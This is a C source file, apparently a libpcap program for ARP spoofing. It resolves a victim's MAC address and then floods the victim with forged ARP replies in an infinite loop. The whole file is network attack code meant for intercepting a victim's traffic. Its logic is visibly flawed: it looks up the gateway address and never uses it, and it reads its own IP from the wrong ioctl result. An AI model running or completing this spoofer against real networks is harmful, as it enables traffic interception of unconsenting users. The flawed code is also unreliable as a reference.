#include <QCoreApplication>
#include <unistd.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

struct in_addr my_ip;
struct ether_addr my_mac;
int GetVictimMac(pcap_t *pcd, const struct in_addr IP, struct ether_addr *MAC);
void makeARPpacket(u_char *packet, const struct in_addr sIP, const struct ether_addr sMAC,
                                   const struct in_addr dIP, const struct ether_addr dMAC, uint16_t ARPop);
void sendFakeARP(pcap_t *pcd, const struct in_addr sIP, const struct ether_addr sMAC,
                              const struct in_addr dIP, const struct ether_addr dMAC);


int main(int argc, char *argv[])
{

    pcap_t *pcd;
    char *dev;
    struct in_addr gateway_ip, victim_ip;
    struct ether_addr victim_mac;

    //initial device
    char errbuf[PCAP_ERRBUF_SIZE];
    dev=pcap_lookupdev(errbuf);
    pcd=pcap_open_live(dev,BUFSIZ,0,-1,errbuf);

    //GET Victim IP
    inet_aton(argv[1], &victim_ip);

    //Get my ip, mac
    int s=socket(AF_INET, SOCK_DGRAM,0);
    struct ifreq ifr;
    strcpy(ifr.ifr_name, dev);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    memcpy(my_mac.ether_addr_octet,ifr.ifr_hwaddr.sa_data,6);
    my_ip= ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr;

    //Get Gateway IP
    FILE* fp;
    char cmd[256] = {0x0};
    char IPbuf[20] = {0x0};
    sprintf(cmd,"route -n | grep '%s' | grep 'UG' | awk '{print $2}'", dev);
    fp = popen(cmd, "r");
    fgets(IPbuf, sizeof(IPbuf), fp);
    pclose(fp);
    inet_aton(IPbuf, &gateway_ip);

    //Get Victim Mac
    GetVictimMac(pcd, victim_ip, &victim_mac);

    //Send Fake ARP packet
    sendFakeARP(pcd, victim_ip, victim_mac, my_ip, my_mac);

}
int GetVictimMac(pcap_t *pcd, const struct in_addr IP, struct ether_addr *MAC)
{
    int status;
    struct ether_addr BroadcastMAC;
    struct ether_header *etherHdr;
    struct ether_arp *arpHdr;
    struct pcap_pkthdr *recvHeader;
    const u_char *recvPacket;
    u_char sendPacket[sizeof(struct ether_header) + sizeof(struct ether_arp)];

    // make ARP REQUEST packet
    ether_aton_r("ff:ff:ff:ff:ff:ff", &BroadcastMAC);
    makeARPpacket(sendPacket, my_ip, my_mac, IP, BroadcastMAC, ARPOP_REQUEST);

    // send and get ARP response
    while(1)
    {
        // send Request
        if(pcap_inject(pcd, sendPacket, sizeof(sendPacket))==-1)
        {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        }

        // get Response
        status = pcap_next_ex(pcd, &recvHeader, &recvPacket);
        if(status!=1)
            continue;

        // check if it's ARP packet
        etherHdr = (struct ether_header*)recvPacket;
        if(etherHdr->ether_type!=htons(ETHERTYPE_ARP))
            continue;

        // check if it's 1)ARP Reply 2)from the desired source
        arpHdr = (struct ether_arp*)(recvPacket + sizeof(struct ether_header));
        if(arpHdr->arp_op != htons(ARPOP_REPLY))
            continue;
        if(memcmp(&arpHdr->arp_spa, &IP.s_addr, sizeof(in_addr_t))!=0)
            continue;

        // if so, copy MAC addr
        memcpy(&MAC->ether_addr_octet, &arpHdr->arp_sha, ETHER_ADDR_LEN);

        break;
    }


    return 0;
}
void makeARPpacket(u_char *packet, const struct in_addr sIP, const struct ether_addr sMAC,
                                   const struct in_addr dIP, const struct ether_addr dMAC, uint16_t ARPop)
{
    struct ether_header etherHdr;
    struct ether_arp arpHdr;

    // Ethernet header
    etherHdr.ether_type = htons(ETHERTYPE_ARP);
    memcpy(etherHdr.ether_dhost, &dMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(etherHdr.ether_shost, &sMAC.ether_addr_octet, ETHER_ADDR_LEN);

    // ARP header
    arpHdr.arp_hrd = htons(ARPHRD_ETHER);
    arpHdr.arp_pro = htons(ETHERTYPE_IP);
    arpHdr.arp_hln = ETHER_ADDR_LEN;
    arpHdr.arp_pln = sizeof(in_addr_t);
    arpHdr.arp_op  = htons(ARPop);
    memcpy(&arpHdr.arp_sha, &sMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(&arpHdr.arp_spa, &sIP.s_addr, sizeof(in_addr_t));
    memcpy(&arpHdr.arp_tha, &dMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(&arpHdr.arp_tpa, &dIP.s_addr, sizeof(in_addr_t));

    // build packet
    memcpy(packet, &etherHdr, sizeof(struct ether_header));
    memcpy(packet+sizeof(struct ether_header), &arpHdr, sizeof(struct ether_arp));
    return;
}
void sendFakeARP(pcap_t *pcd, const struct in_addr sIP, const struct ether_addr sMAC,
                              const struct in_addr dIP,   const struct ether_addr dMAC)
{
    u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];

    makeARPpacket(packet, dIP, dMAC, sIP, sMAC, ARPOP_REPLY);

    while(1)
    {
        // sending
        if(pcap_inject(pcd, packet, sizeof(packet))==-1)
        {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        }
        sleep(1);
    }

    return;
}



